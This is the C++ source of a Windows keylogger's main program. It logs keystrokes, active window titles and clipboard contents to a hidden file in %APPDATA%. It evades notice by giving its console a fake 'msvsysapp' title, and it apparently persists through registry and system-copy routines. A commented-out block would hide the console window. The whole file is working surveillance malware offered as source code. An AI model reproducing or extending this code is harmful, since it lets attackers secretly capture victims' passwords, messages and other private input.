//KeyLogger.cpp 
#include <iostream>
#include "KeyLogger.h"
#include <fstream>
#include <Windows.h>
#include "CClip.h"
#include <ctime>
#include <string>

const std::string LogPath = getenv("APPDATA") + std::string("\\logs.dat");

int main(int argc, char * argv[])
{
	//HWND stealth; // window handler used to hide the outputted console window
	//AllocConsole();
	//stealth = FindWindowA("ConsoleWindowClass", NULL);
	//ShowWindow(stealth, 0);
	std::fstream logFile, clipFile;
	KeyLogger k;
	CClip cp;
	time_t sysbasetime = time(0);
	char * date = ctime(&sysbasetime);
	std::string handle = k.GetWindowTitle();
	CreateMutex(NULL, TRUE, "8154d1e24f699f5b217f5ebc8c8c823c");
	if (GetLastError() != ERROR_ALREADY_EXISTS) {
		SetConsoleTitle("msvsysapp");
		Sleep(500);
		k.AddREG();
		k.CopyToSys(argv[0]);
		std::cout << "[  i  ] Starting KeyLogger...	[  i  ]";
		logFile.open(LogPath.c_str() , fstream::app);
		logFile << "\n \n   " << date << '\n'
			<< "APP: " << handle << '\n';
		logFile.close();
		while (true) {
			if (handle != k.GetWindowTitle()) {
				logFile.open(LogPath.c_str(), fstream::app);
				logFile << "\n \nAPP: " << k.GetWindowTitle() << '\n';
				handle = k.GetWindowTitle();
				logFile.close();
			}
			k.OEMkeys(logFile);
			k.AZkeys(logFile);
			k.NUMkeys(logFile);
			k.SpecialKeys(logFile);
			cp.GetClipboard(clipFile);
		}
	}
	system("pause");
	return 0;
}
